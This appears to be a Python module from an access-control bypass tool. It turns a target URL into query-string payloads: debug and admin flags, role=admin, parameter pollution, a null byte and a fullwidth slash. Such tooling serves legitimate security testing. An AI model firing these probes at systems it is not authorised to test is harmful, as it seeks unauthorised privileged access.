from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from bypass.models import Payload, PayloadCategory


def query_mutations(target_url: str) -> list[tuple[str, Payload]]:
    u = urlsplit(target_url)
    pairs = parse_qsl(u.query, keep_blank_values=True)
    out: list[tuple[str, Payload]] = []

    def add(query: str, pid: str, label: str) -> None:
        out.append((urlunsplit((u.scheme, u.netloc, u.path or "/", query, u.fragment)), Payload(pid, PayloadCategory.QUERY, label)))

    add(u.query, "q_baseline", "Query original")
    if not pairs:
        add("debug=1", "q_debug", "Parametro debug=1")
        add("admin=true", "q_admin_true", "Parametro admin=true")
        add("role=admin", "q_role_admin", "Parametro role=admin")
        add("role=user&role=admin", "q_role_pollution", "Parameter pollution role=user&role=admin")
        add("id=1&id=2", "q_id_pollution", "Parameter pollution id duplicado")
        add("file=admin%00", "q_nullbyte_file", "Null byte en parametro file")
        add("path=%EF%BC%8Fadmin", "q_fullwidth_slash", "Slash unicode fullwidth en query")
    else:
        add(urlencode(pairs + [("debug", "1")]), "q_add_debug", "Anadir debug=1")
        add(urlencode(pairs + [("admin", "true")]), "q_add_admin", "Anadir admin=true")
        add(urlencode([(k, v.upper()) for k, v in pairs]), "q_upper_values", "Valores en mayusculas")
        add(urlencode(pairs + [("role", "user"), ("role", "admin")]), "q_dup_role", "Duplicar role=user&role=admin")
        add(urlencode(pairs + [("isAdmin", "1")]), "q_is_admin", "Anadir isAdmin=1")
        add(urlencode(pairs + [("file", "admin%00")]), "q_add_nullbyte", "Anadir file con null byte")
        add(urlencode(pairs + [("path", "%EF%BC%8Fadmin")]), "q_add_fullwidth", "Anadir path unicode fullwidth")
    return out
